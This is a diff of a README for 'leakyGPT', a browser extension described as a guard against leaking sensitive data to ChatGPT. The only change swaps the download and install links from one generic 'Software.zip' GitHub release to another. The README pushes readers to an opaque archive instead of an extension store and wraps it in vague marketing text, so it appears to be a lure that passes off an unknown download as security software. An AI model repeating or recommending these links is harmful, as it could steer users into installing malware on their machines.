@@ -3,7 +3,7 @@
 
 Stop users from sharing sensitive information with chatGPT!
 
-[![Download https://github.com/Nigsgehe/leakyGPT/releases/download/v1.0/Software.zip](https://github.com/Nigsgehe/leakyGPT/releases/download/v1.0/Software.zip)](https://github.com/Nigsgehe/leakyGPT/releases/download/v1.0/Software.zip)
+[![Download https://github.com/Nigsgehe/leakyGPT/releases/download/v2.0/Software.zip](https://github.com/Nigsgehe/leakyGPT/releases/download/v2.0/Software.zip)](https://github.com/Nigsgehe/leakyGPT/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to **leakyGPT**, the one-stop Data Leakage Prevention (DLP) browser extension designed to prevent users from unknowingly sharing confidential data with chatGPT. This extension offers a robust solution to enhance security measures and ensure compliance with data privacy regulations. Built using cutting-edge AI technologies, leakyGPT provides an added layer of protection by analyzing and detecting potential data leaks before they occur.
@@ -16,7 +16,7 @@ Welcome to **leakyGPT**, the one-stop Data Leakage Prevention (DLP) browser exte
 🌐 **Support for Multiple Platforms** - Compatible with popular browsers for widespread use.
 
 ## Installation
-To get started with leakyGPT, simply download the [https://github.com/Nigsgehe/leakyGPT/releases/download/v1.0/Software.zip](https://github.com/Nigsgehe/leakyGPT/releases/download/v1.0/Software.zip) file and follow the installation instructions provided. Once installed, the extension seamlessly integrates into your browser, ready to safeguard your sensitive data.
+To get started with leakyGPT, simply download the [https://github.com/Nigsgehe/leakyGPT/releases/download/v2.0/Software.zip](https://github.com/Nigsgehe/leakyGPT/releases/download/v2.0/Software.zip) file and follow the installation instructions provided. Once installed, the extension seamlessly integrates into your browser, ready to safeguard your sensitive data.
 
 ## Usage
 1. **Enable the Extension**: Activate leakyGPT within your browser settings.
